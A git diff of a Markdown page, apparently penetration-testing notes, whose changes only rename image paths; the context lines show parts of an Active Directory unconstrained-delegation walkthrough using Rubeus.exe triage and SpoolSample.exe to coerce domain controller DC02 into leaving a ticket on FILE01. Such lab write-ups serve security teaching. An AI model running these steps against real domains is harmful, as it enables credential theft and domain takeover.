@@ -37,7 +37,7 @@ The attack will start from the perspective of already owning the `FILE01` server
 .\Rubeus.exe triage
 ```
 
-![](<../../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../../.gitbook/assets/image (16) (1) (2).png>)
 
 2\. There is no ticket for `DC02`. We can execute the spoolsample to force the DC to authenticate to the `FILE01` server and leave a TGT ticket. We can do this with the following command:
 
@@ -45,7 +45,7 @@ The attack will start from the perspective of already owning the `FILE01` server
 .\SpoolSample.exe DC02.amsterdam.bank.local FILE01
 ```
 
-![](<../../../../.gitbook/assets/image (53).png>)
+![](<../../../../.gitbook/assets/image (53) (2).png>)
 
 3\. Now when we check if there is a ticket on `FILE01` for `DC02` and there is:
 
@@ -58,7 +58,7 @@ The attack will start from the perspective of already owning the `FILE01` server
 .\SpoolSample.exe DC02.amsterdam.bank.local FILE01
 ```
 
-![](<../../../../.gitbook/assets/image (6) (1).png>)
+![](<../../../../.gitbook/assets/image (6) (1) (2).png>)
 
 Inject the ticket:
 
